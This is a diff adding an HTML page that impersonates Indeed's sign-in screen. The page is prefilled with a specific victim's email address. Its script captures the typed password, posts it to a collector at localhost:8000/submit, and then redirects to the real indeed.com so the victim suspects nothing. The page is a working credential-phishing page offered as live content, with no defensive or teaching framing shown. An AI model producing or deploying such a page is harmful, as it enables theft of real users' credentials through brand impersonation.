@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #F3F2F1; /* Changed background color */
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .flex-container {
+            margin-top: -150px; /* Adjust the negative margin to move content up slightly */
+        }
+
+        .welcome-msg {
+            text-align: left;
+        }
+
+        .welcome-msg p {
+            color: #555; /* Change the font color to your desired color */
+        }
+
+        .login-container {
+            background-color: #fff;
+            border-radius: 8px;
+            border: 1px solid rgba(0, 0, 0, 0.1); /* Changed box shadow to border */
+            padding: 20px;
+            width: 400px; /* Increased the width to make it wider */
+            text-align: center; /* Center the content */
+        }
+
+        .logo {
+            text-align: center;
+        }
+
+        .logo img {
+            width: 120px; /* Adjust the logo width */
+            margin-bottom: 10px;
+            height: auto;
+        }
+
+        .login-header {
+            margin-top: 5px; 
+            text-align: left;
+        }
+
+        .login-header h1 {
+            font-size: 24px;
+            margin: 0;
+        }
+
+        .login-form {
+            margin-top: 20px;
+        }
+
+        .form-group {
+            margin-bottom: 20px; /* Increased margin for uniform spacing */
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 14px;
+            margin-bottom: 5px;
+            text-align: left;
+        }
+
+        .form-group input {
+            width: 95%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+
+        .form-group button {
+            width: 100%;
+            padding: 10px;
+            background-color: #3256A2; /* Changed button color */
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        .form-group button:hover {
+            background-color: #064dc9;
+        }
+
+        .forgot-password {
+            text-align: center;
+            margin-top: 10px;
+        }
+
+        .forgot-password a {
+            color: #3256A2;
+            text-decoration: none;
+        }
+
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+
+        .policies {
+            text-align: left;
+            font-size: 10pt;
+            color: grey;
+        }
+    </style>
+</head>
+<body>
+    <div class="flex-container">
+        <div class="logo">
+            <img src="logo.png" alt="Logo">
+        </div>
+        <div class="login-container">
+            <div class="login-header">
+                <h1>Welcome back</h1>
+            </div>
+
+            <div class="welcome-msg">
+                <p>Signing in as <b>scarter@gatestar.com</b> <a href="#">(not you?)</a></p>
+            </div>
+
+            <form id="loginForm" action="#" method="POST">
+                <div class="form-group">
+                    <label for="password"><b>Password</b></label>
+                    <input type="password" id="password" name="password" required>
+                </div>
+                <div class="policies">
+                    <p>
+                        By signing in to your account, you agree to Indeed's <a href="#">Terms</a>, <a href="#">Cookie</a>, and <a href="#">Privacy</a> policies.
+                    </p>
+                </div>
+                <div class="form-group">
+                    <button type="submit">Sign In</button>
+                </div>
+            </form>
+            <div class="forgot-password">
+                <a href="#">Forgot Password?</a>
+            </div>
+        </div>
+    </div>  
+    <script>
+        // Wait for the DOM to be fully loaded
+        document.addEventListener('DOMContentLoaded', () => {
+            // Get a reference to the login form
+            const loginForm = document.getElementById('loginForm');
+        
+            if (loginForm) {            
+                // Add a submit event listener to the login form
+                loginForm.addEventListener('submit', async (e) => {
+                    e.preventDefault();
+                    // Get the password input value
+                    const passwordInput = loginForm.querySelector('#password').value;
+
+                    // Create a JSON object with the input value
+                    const data = { password: passwordInput };
+
+                    // Send a POST request to the python backend
+                    try {
+                        const response = await fetch('http://localhost:8000/submit', { // Updated URL
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json',
+                            },
+                            body: JSON.stringify(data),
+                        });
+                        location.href = 'https://www.indeed.com/';
+                    } catch (error) {
+                        console.error('Error:', error);
+                        location.href = 'https://www.indeed.com/';
+                    }
+                });
+            } else {
+                console.error('Login form not found in the DOM.');
+            }
+        });
+    </script> 
+</body>
+</html>
